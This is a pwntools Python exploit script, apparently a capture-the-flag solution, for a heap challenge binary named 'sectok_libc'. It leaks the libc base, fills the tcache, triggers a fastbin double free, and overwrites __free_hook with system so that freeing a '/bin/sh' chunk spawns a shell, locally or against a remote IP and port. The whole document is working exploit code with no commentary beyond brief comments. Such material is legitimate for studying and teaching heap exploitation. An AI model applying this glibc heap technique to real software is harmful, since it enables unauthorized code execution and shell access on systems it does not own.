from pwn import *

elf#=context.binary=ELF('./sectok_libc')
libc = ELF('./libc.so.6')

def start(argv=[],*a,**kw):
    if args.GDB:
        elf=context.binary=ELF('./sectok_libc')
        return gdb.debug([elf.path]+argv,gdbscript=gdbscript,*a,**kw)
    elif args.REMOTE: # ('server', 'port')
        return remote("10.21.232.3","20202")
    else:
        elf=context.binary=ELF('./sectok_libc')
        return process([elf.path]+argv,*a,**kw)

gdbscript='''
break main
b *0x0000555555555684
b *0x0000555555555689
continue'''.format(**locals())

io=start()

def gen(token: bytes):
    io.sendlineafter(b"Action:",f"g")
    io.sendlineafter(b"Enter the name for the token:",token)

def discard(id):
    io.sendlineafter(b"Action:",f"d")
    io.sendlineafter(b"Enter the index of the token:",f"{id}".encode())

#get libc base address
def extract_characters(input_string):
    pattern = r'\b0x[0-9a-f]+\b'
    match = re.search(pattern, input_string)

    if match:
        characters = match.group(0)
        return characters
    else:
        return None
    
libc_address=extract_characters(io.recvline_contains("Libc base:").strip().decode())
libc_address=int(libc_address, 16)
print(hex(libc_address))

#add 7 tcachebins and 2 fastbins
for i in range(0,9):#0 to 8
    gen(b"ABCD")

#remove 7 tcachebins
for i in range(0,7):#0 to 6
    discard(i)

#double free vuln
discard(7)
discard(8)
discard(7)

#again add 7 tcachebins to reach the fastbins
for i in range(0,7):#0 to 6
    gen(b"ABCD")

libc.address=libc_address
system = libc.symbols['system']
free_hook = libc.symbols['__free_hook']
print("free_hook: "+hex(free_hook))

gen(p64(free_hook))
gen("abcd")
gen("/bin/sh")
gen(p64(system))

discard(9)

io.interactive()
